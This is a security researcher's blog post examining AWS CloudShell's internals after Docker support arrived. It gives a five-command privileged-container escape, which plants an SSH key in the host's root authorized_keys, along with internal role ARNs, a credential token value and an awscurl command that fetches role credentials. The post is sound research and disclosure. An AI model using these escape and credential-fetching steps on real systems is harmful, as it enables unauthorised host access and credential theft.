---
layout: post
title: Deep dive into AWS CloudShell
date:
  created: 2024-01-11T21:07:00
categories:
  - AWS
---

<!-- more -->

AWS CloudShell got a [new capability][whats-new] in January 2024: running Docker 
containers. This piqued my curiosity because Docker-in-Docker usually implies
privileged containers, and I have previously used that to [escape CodeBuild][codebuild]
onto the parent EC2 instance. I wanted to know if the same could be done in 
CloudShell - and how its AWS credential system worked (the environment inherits
the user's credentials, unlike CodeBuild). The short answer is "it can be done", 
and this post goes into a) how to do it and b) documenting what I could learn 
about the inner workings of CloudShell.

## Container escape

The CloudShell environment itself runs on a container on an EC2 instance. "Escaping" 
the container is relatively easy because it is a privileged container. These are 
the steps I took:

1. `sudo -i` to start a shell as `root`.
2. `mkdir /host && mount /dev/nvme0n1p1 /host`. This mounts the host EC2 
   filesystem into the `/host` directory of the container. 
3. `ssh-keygen` to generate an SSH keypair.
4. `cat /root/.ssh/id_rsa.pub >> /host/root/.ssh/authorized_keys`
5. `ssh $(uname -n)` to SSH into the host EC2 instance.

## Looking around

Once on the EC2 instance, I was interested to see how the credentials were provided
to the CloudShell environment. The CloudShell environment has the following two
environment variables that determine credential retrieval:

* `AWS_CONTAINER_CREDENTIALS_FULL_URI=http://localhost:1338/latest/meta-data/container/security-credentials`
* `AWS_CONTAINER_AUTHORIZATION_TOKEN=T0yMmQ5cHLbmd15fL45al1bK1Aw/Ty6rNtQ8V4Q/3DM=`

The first env var is the URL that the AWS CLI and SDKs will send a GET request 
to get credentials. The second env var contains the value sent in the `Authorization`
request header during that request. Based on this, we now know there's a program
listening on local port 1338 and vending credentials - we'll use that in our 
search.

### Containers

On the EC2 host, I ran `docker ps` and saw a few containers running. Running 
`docker inspect $cid` on them reveals that they are managed by AWS ECS. The image 
itself is `507722522093.dkr.ecr.ap-southeast-2.amazonaws.com/mde-images:live_base_100`.
I have copied this to [public.ecr.aws/aidansteele/cloudshell:live_base_100][top-image]
if you want to take a look. 

There are two relevant containers, both running the above image. The first is 
the "controller" container, running `/usr/bin/controller` in a few different
"modes". The `/usr/bin/controller -mode credentials` process is the interesting
one that is serving port 1338.

The second container is the "base" container. It is running the same binary, but
in `base-container` mode. This process is parent to `dockerd`. It uses this
Docker-in-Docker to run a different image:
`117854687782.dkr.ecr.ap-southeast-2.amazonaws.com/scallop-customer-image:latest-patched` - 
this image is copied to [public.ecr.aws/aidansteele/cloudshell:scallop-customer-image-latest-patched][inner-image]. 
This is where the CloudShell environment exists, so it's actually 
Docker-in-Docker-in-Docker. Each CloudShell session runs inside a `tmux` session
in this inner container. 

![diagram](/assets/2024-01-12-diagram.png)

### IAM roles

There are a number of roles involved here:

The EC2 instance role has a role session ARN that looks like this:
`arn:aws:sts::624018990330:assumed-role/moontide-ecs-ec2-cluster-moontidedevstandard1micr-1A1CJ1ZR4CHF9/i-01a473779ad5984cc`. 
This role seems to have the `AmazonEC2ContainerServiceforEC2Role` managed policy
and some explicit denies to further narrow it down.

The ECS-managed containers all use the same "ECS task IAM role". Its ARN looks like:
`arn:aws:sts::624018990330:assumed-role/moontide-task-role-control-plane/i-02d8913df95941b0a22cd3726ead75d0`.

There's the ECS task _execution_ IAM role, used for pulling ECR images and pushing
logs to CloudWatch. Its ARN looks like:
`arn:aws:sts::624018990330:assumed-role/moontide-task-execution-role/i-02d8913df95941b0a22cd3726ead75d0`.

The ECS task IAM role is used by the credential server process to retrieve 
credentials from the private control plane API and return them to the CloudShell
environment on-demand. That API is powered by API Gateway and uses SigV4 (IAM)
authentication. If you install `awscurl` into the "controller" container, you 
can replicate the credential-fetching functionality by running this:

```
awscurl \
  --service execute-api \
  --region ${AWS_REGION} \
  ${CALLBACK_SERVICE_ENDPOINT_DNS}/${INSTANCE_ID}/credentials/role
```

## Assorted thoughts

* There seem to be multiple ECS clusters per CloudShell AWS account. There are
  also multiple CloudShell AWS accounts per region. Two principals in my own account
  got mapped to entirely different CloudShell AWS accounts. I wonder what the
  mapping algorithm is.
* The role session name for the "control plane" role looks like a very long EC2
  instance ID. What is it?
* In my (limited) testing, the EC2 instance is always a t3.medium
* The EC2 instance has a public IP address. I guess this saves money on a NAT
  gateway. It has a security group that allows no inbound traffic, though.
* This "moontide" binary makes a few references to Cloud9, so I think maybe
  there is shared heritage there. I haven't looked into Cloud9 to see how
  closely CloudShell reflects it.
* There are references to interesting objects in S3. I can't figure out how to
  access them. I don't know if that's because they're only useful for Cloud9,
  or there is extra functionality I couldn't reverse-engineer.
* AWS does a good job of defence-in-depth. Even though I "escaped" the container,
  their internal API Gateway is locked down to only allow access in legitimate
  scenarios. Many other places wouldn't do that and have a "soft" interior.
* There is a line in the EC2 userdata that looks like it intends to block access
  to the EC2 IMDS from the containers. It doesn't work, but I'm also so weak at
  `iptables` that I can't even suggest a fix.
* Thanks go to [Christophe Tafani-Dereeper][christophe] and [Nick Frichette][nick] 
  for their collaboration on poking at this. It helped a lot bouncing ideas around 
  with them. 

## Update

I just learned about [this write-up][ronin] of CloudShell published last year.
What stood out to me is that CloudShell previously used Firecracker microVMs,
but no longer does. I wonder why the migration to "regular" EC2 instances occurred.
Maybe it was to support this new functionality (runner Docker containers)?

[whats-new]: https://aws.amazon.com/about-aws/whats-new/2024/01/aws-cloudshell-docker-13-regions/
[codebuild]: https://awsteele.com/blog/2022/02/03/aws-vpc-data-exfiltration-using-codebuild.html
[top-image]: https://ima.ge.cx/public.ecr.aws/aidansteele/cloudshell:live_base_100@sha256:4f0e65aee2f0d3efcee5717afb8d559a413dccdc1077ee9ef214d382baecfc8f
[inner-image]: https://ima.ge.cx/public.ecr.aws/aidansteele/cloudshell:scallop-customer-image-latest-patched@sha256:175f1cd92c6c4cf67433742e3fbf44983430d4f24f6c338241fd1569b0bde700
[christophe]: https://twitter.com/christophetd
[nick]: https://frichetten.com/
[ronin]: https://ronin.ae/news/aws-cloudshell-analysis/
